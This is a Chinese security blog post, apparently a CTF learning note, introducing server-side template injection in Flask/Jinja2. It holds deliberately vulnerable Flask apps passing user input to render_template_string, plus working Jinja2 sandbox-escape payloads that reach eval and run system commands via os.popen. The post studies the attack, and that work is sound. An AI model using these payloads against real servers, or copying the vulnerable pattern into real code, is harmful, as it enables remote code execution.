@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/tu.ico">
+  <link rel="mask-icon" href="/images/tu.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mayi077.github.io","root":"/","scheme":"Mist","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":"ture","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":"ture"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":"ture","mediumzoom":false,"lazyload":"ture","pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":"ture","preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言&amp;emsp;尽管以前遇到过这种漏洞的题目，但这次做到还是这么陌生，是该记录一下了。 初步认识&amp;emsp;ssti,服务端模板注入。应该可以这么理解，模板里面有些需要用户输入的东西，但是程序员在渲染模板的时候，没有检查用户输入的东西是不是都是善意的，于是就被用户拿下了这个模板做坏事了。&amp;emsp;模板只是一种提供给程序来解析的一种语法,就是说不同的模板可能有不同的语法。不过据我暂时了解php、p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初识 SSTI 服务端模板注入攻击">
+<meta property="og:url" content="https://mayi077.github.io/2020/03/21/%E5%88%9D%E8%AF%86-SSTI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="信安小蚂蚁">
+<meta property="og:description" content="前言&amp;emsp;尽管以前遇到过这种漏洞的题目，但这次做到还是这么陌生，是该记录一下了。 初步认识&amp;emsp;ssti,服务端模板注入。应该可以这么理解，模板里面有些需要用户输入的东西，但是程序员在渲染模板的时候，没有检查用户输入的东西是不是都是善意的，于是就被用户拿下了这个模板做坏事了。&amp;emsp;模板只是一种提供给程序来解析的一种语法,就是说不同的模板可能有不同的语法。不过据我暂时了解php、p">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.downk.cc/item/5e74c071c8156f1e6ff3b4a5.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e74afa0c8156f1e6fea2b7d.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e74b9b7c8156f1e6ff0946f.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e756d0f9d7d586a54867be5.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e756d5b9d7d586a5486b2bc.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e7572239d7d586a5488ae82.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e7578de9d7d586a548c79c1.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e7582d99d7d586a54945985.jpg">
+<meta property="og:image" content="https://pic.downk.cc/item/5e7583639d7d586a5494b710.jpg">
+<meta property="article:published_time" content="2020-03-21T03:03:55.000Z">
+<meta property="article:modified_time" content="2020-03-24T12:16:12.000Z">
+<meta property="article:author" content="信安小蚂蚁">
+<meta property="article:tag" content="基础积累">
+<meta property="article:tag" content="日常笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.downk.cc/item/5e74c071c8156f1e6ff3b4a5.jpg">
+
+<link rel="canonical" href="https://mayi077.github.io/2020/03/21/%E5%88%9D%E8%AF%86-SSTI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>初识 SSTI 服务端模板注入攻击 | 信安小蚂蚁</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">信安小蚂蚁</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right"></div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2020/03/21/%E5%88%9D%E8%AF%86-SSTI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="信安小蚂蚁">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="信安小蚂蚁">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          初识 SSTI 服务端模板注入攻击
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-03-21 11:03:55" itemprop="dateCreated datePublished" datetime="2020-03-21T11:03:55+08:00">2020-03-21</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-24 20:16:12" itemprop="dateModified" datetime="2020-03-24T20:16:12+08:00">2020-03-24</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%97%A5%E5%B8%B8%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
+                    <span itemprop="name">日常笔记</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>13 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>&emsp;尽管以前遇到过这种漏洞的题目，但这次做到还是这么陌生，是该记录一下了。</p>
+<h3 id="初步认识"><a href="#初步认识" class="headerlink" title="初步认识"></a>初步认识</h3><p>&emsp;ssti,服务端模板注入。应该可以这么理解，模板里面有些需要用户输入的东西，但是程序员在渲染模板的时候，没有检查用户输入的东西是不是都是善意的，于是就被用户拿下了这个模板做坏事了。<br>&emsp;模板只是一种提供给程序来解析的一种语法,就是说不同的模板可能有不同的语法。不过据我暂时了解php、python的模板是这样执行代码的<code>{{执行的代码}}</code>如<code>{{system("cat flag")}}</code> 而java的模板是使用<code>${system("ls")}</code>这样来执行代码。<br><a href="https://pic.downk.cc/item/5e74c071c8156f1e6ff3b4a5.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e74c071c8156f1e6ff3b4a5.jpg" alt=""></a><br>&emsp;接下来我会在本地安装搭建flask模板环境。<br>首先以管理员身份打开cmd 运行 pip3 install flask 来安装flask模块，安装成功后使用以下代码来测试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">##import 和 from 模块  import 函数 的区别是：</span><br><span class="line">## import 模块：导入一个模块；注：相当于导入的是一个文件夹，是个相对路径。 调用模块.函数</span><br><span class="line">##from…import：导入了一个模块中的一个函数；注：相当于导入的是一个文件夹中的文件，是个绝对路径。 调用可直接使用函数</span><br><span class="line">from flask import Flask</span><br><span class="line"></span><br><span class="line">app&#x3D;Flask(__name__)</span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">def hello_world():</span><br><span class="line">    return &#39;Hello World&#39;</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+<p>运行结果会给一个链接，点击连接及可看到 Hello World。<br><a href="https://pic.downk.cc/item/5e74afa0c8156f1e6fea2b7d.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e74afa0c8156f1e6fea2b7d.jpg" alt=""></a><br>解析以下上面的代码：</p>
+<ol>
+<li><p><code>@app.route(&#39;/&#39;)</code> 路由装饰器，告诉flask 什么样的URL能触发我们的函数.route（）装饰器把一个函数绑定到对应的URL上，这句话相当于路由，一个路由跟随一个函数，如</p>
+</li>
+<li><p>main入口：当.py文件被直接运行时，if name == ‘main‘之下的代码块将被运行；当.py文件以模块形式被导入时，if name == ‘main‘之下的代码块不被运行。如果需要做一个稍微大一点的python开发，写 if name ==’main’ 是一个良好的习惯。</p>
+</li>
+<li><p>在测试的时候加编写如下可以方便调试，修改代码的时候直接保存，网页刷新就可以了，如果不加debug，那么每次修改代码都要运行一次程序，并且把前一个程序关闭。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.debug &#x3D; True</span><br><span class="line">    app.run()</span><br><span class="line">或</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run(debug&#x3D;True)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>app.run(host=&#39;0.0.0.0&#39;)</code>这会让操作系统监听所有公网 IP,此时便可以在公网上看到自己的web。</p>
+</li>
+</ol>
+<h4 id="模板渲染（重点）"><a href="#模板渲染（重点）" class="headerlink" title="模板渲染（重点）"></a>模板渲染（重点）</h4><p>&emsp;可以使用 render_template() 方法来渲染模板。我们需要做的就是将模板名和想要作为关键字的参数传入模板的变量。<br>&emsp;首先我们因该明白render_template函数渲染的是和它同级文件夹templates下的模板。模板就是自己写的html，里面的参数需要我们根据每个用户不同来传入变量。<br>首先我们创一个 templates 文件夹并向里面写入一个index.html文件内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;&#123;&#123;title&amp;#125;&amp;#125; - 信安小蚂蚁&lt;&#x2F;title&gt;</span><br><span class="line">  &lt;&#x2F;head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">      &lt;h1&gt;Hello, &amp;#123;&amp;#123;user.name&#125;&#125;!&lt;&#x2F;h1&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>其中有2个参数需要我们渲染，title和user.name。接着我们在templates文件夹同级来创一个app.py文件，内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from flask import render_template</span><br><span class="line">from flask import Flask</span><br><span class="line">app&#x3D;Flask(__name__)</span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br><span class="line">@app.route(&#39;&#x2F;index&#39;)  #我们访问&#x2F;或者&#x2F;index都会跳转</span><br><span class="line">def index():</span><br><span class="line">   user &#x3D; &#123;&#39;name&#39;: &#39;信安小蚂蚁&#39;&#125;#传入一个字典数组</span><br><span class="line">   return render_template(&quot;index.html&quot;,title&#x3D;&#39;Home&#39;,user&#x3D;user)</span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">    app.run(debug&#x3D;True)</span><br></pre></td></tr></table></figure>
+
+<p>运行后得到链接，访问得<br><a href="https://pic.downk.cc/item/5e74b9b7c8156f1e6ff0946f.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e74b9b7c8156f1e6ff0946f.jpg" alt=""></a><br>这次渲染我们没有使用用户可控的变量，所以是安全的，如果我们交给用户可控并且不过滤参数就有可能造成SSTI模板注入漏洞。</p>
+<h3 id="简单的测试"><a href="#简单的测试" class="headerlink" title="简单的测试"></a>简单的测试</h3><p>&emsp;第一个测试出了点问题，window，Linux下都没能解决，记录代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">from flask import render_template_string</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line">@app.route(&#39;&#x2F;ssti&#39;,methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def test():</span><br><span class="line">    template &#x3D; &#39;&#39;&#39;</span><br><span class="line">        &lt;div class&#x3D;&quot;center-content error&quot;&gt;</span><br><span class="line">            &lt;h1&gt;Oops! That page doesn&#39;t exist.&lt;&#x2F;h1&gt;</span><br><span class="line">            &lt;h3&gt;%s&lt;&#x2F;h3&gt;</span><br><span class="line">        &lt;&#x2F;div&gt; </span><br><span class="line">    &#39;&#39;&#39; %(request.url)</span><br><span class="line"></span><br><span class="line">    return render_template_string(template)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.debug &#x3D; True</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+<p>代码并不难理解，问题出在windows浏览器访问时会把<code>{}</code>给urlencode 导致没能达到我们想要的效果。而centos中我使用curl 访问时输入<code>{{}}</code> 符号就会报错<code>curl: (3) [globbing] nested braces not supported at pos 22</code></p>
+<p>&emsp;那么我们换一个代码测试一下，代码如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import render_template_string</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line">@app.route(&quot;&#x2F;hello&#x2F;&lt;username&gt;&quot;)</span><br><span class="line">def hello_user(username):</span><br><span class="line">  return render_template_string(&quot;user:%s&quot;%username)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.debug &#x3D; True</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+<p>结果我们可以得到如下：<br><a href="https://pic.downk.cc/item/5e756d0f9d7d586a54867be5.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e756d0f9d7d586a54867be5.jpg" alt=""></a></p>
+<p>但是但我想执行系统命令时却报错<br><a href="https://pic.downk.cc/item/5e756d5b9d7d586a5486b2bc.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e756d5b9d7d586a5486b2bc.jpg" alt=""></a><br>但是题目确实可以执行呀，难道是题目环境写了这个system方法？？<br>&emsp;好像确实是这么一回事，但是没写这个方法还是有机会执行我们的命令的，如在网上找的一串代码可以执行得到如下效果：<br><a href="https://pic.downk.cc/item/5e7572239d7d586a5488ae82.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e7572239d7d586a5488ae82.jpg" alt=""></a></p>
+<h3 id="利用-Python-特性在-Jinja2-模板中执行任意代码"><a href="#利用-Python-特性在-Jinja2-模板中执行任意代码" class="headerlink" title="利用 Python 特性在 Jinja2 模板中执行任意代码"></a>利用 Python 特性在 Jinja2 模板中执行任意代码</h3><p>&emsp;官方的说法是需要在模板环境中注册函数才能在模板中进行调用，例如想要在模板中直接调用内置模块 os，即需要在模板环境中对其注册，示例代码二如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!python</span><br><span class="line"># coding: utf-8</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">from jinja2 import Template</span><br><span class="line"> </span><br><span class="line">template &#x3D; Template(&quot;Your input: &#123;&#125;&quot;.format(sys.argv[1] if len(sys.argv) &gt; 1 else &#39;&lt;empty&gt;&#39;))</span><br><span class="line">template.globals[&#39;os&#39;] &#x3D; os</span><br><span class="line"> </span><br><span class="line">print template.render()</span><br></pre></td></tr></table></figure>
+<p>效果如下：<br><a href="https://pic.downk.cc/item/5e7578de9d7d586a548c79c1.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e7578de9d7d586a548c79c1.jpg" alt=""></a></p>
+<h4 id="重点来了"><a href="#重点来了" class="headerlink" title="重点来了"></a>重点来了</h4><p>&emsp;一般别人也不会蠢着注册一个危险函数给你用把。如何在未注册OS模块的情况下在模板中调用popen()函数执行系统命令呢？在 Jinja2 中模板能够访问 Python 中的内置变量并且可以调用对应变量类型下的方法，用到常见的 Python 沙盒环境逃逸方法。<br>&emsp;具体原理就是：调用python的内置变量一层层的到达我们想要的命令。这里我就记录一个python2，python3 通用的方法来执行eval。<br>pyhton代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for c in ().__class__.__bases__[0].__subclasses__():</span><br><span class="line">    if c.__name__&#x3D;&#x3D;&#39;_IterationGuard&#39;:</span><br><span class="line">        c.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;)</span><br></pre></td></tr></table></figure>
+<p>还是不知道为啥，它执行后没有任何输出。但jinjia是有<br>jinja语法表时为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__&#x3D;&#x3D;&#39;_IterationGuard&#39; %&#125;</span><br><span class="line">&amp;#123;&amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;) &amp;#125;&amp;#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p>效果图如下：<br><a href="https://pic.downk.cc/item/5e7582d99d7d586a54945985.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e7582d99d7d586a54945985.jpg" alt=""></a></p>
+<p>在记一个jinja的命令执行的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;hello&#x2F;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;</span><br><span class="line">      &amp;#123;&amp;#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;dir&quot;).read()&#39;) &amp;#125;&amp;#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<p>效果图如下：<br><a href="https://pic.downk.cc/item/5e7583639d7d586a5494b710.jpg" target="_blank" rel="noopener"><img data-src="https://pic.downk.cc/item/5e7583639d7d586a5494b710.jpg" alt=""></a>  </p>
+<p> <a href="http://www.tiejiang.org/24416.html" target="_blank" rel="noopener">【参考链接1】</a><br> <a href="https://www.cnblogs.com/leixiao-/p/10227867.html" target="_blank" rel="noopener">【参考链接2】</a></p>
+<p><strong>就先记这么多吧现在有点迷糊，日后有机会再捋捋思路</strong></p>
+<h3 id="用tplmap-真的不错"><a href="#用tplmap-真的不错" class="headerlink" title="用tplmap 真的不错"></a>用tplmap 真的不错</h3>
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>信安小蚂蚁
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://mayi077.github.io/2020/03/21/%E5%88%9D%E8%AF%86-SSTI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" title="初识 SSTI 服务端模板注入攻击">https://mayi077.github.io/2020/03/21/初识-SSTI-服务端模板注入攻击/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>ZERO</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+     <div>
+       
+         ﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+         
+      </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%9F%BA%E7%A1%80%E7%A7%AF%E7%B4%AF/" rel="tag"><i class="fa fa-tag"></i>基础积累</a>
+              <a href="/tags/%E6%97%A5%E5%B8%B8%E7%AC%94%E8%AE%B0/" rel="tag"><i class="fa fa-tag"></i>日常笔记</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/03/19/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" rel="prev" title="SSI注入漏洞">
+      <i class="fa fa-chevron-left"></i> SSI注入漏洞
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/03/22/preg-replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" rel="next" title="preg_replace与代码执行">
+      preg_replace与代码执行 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
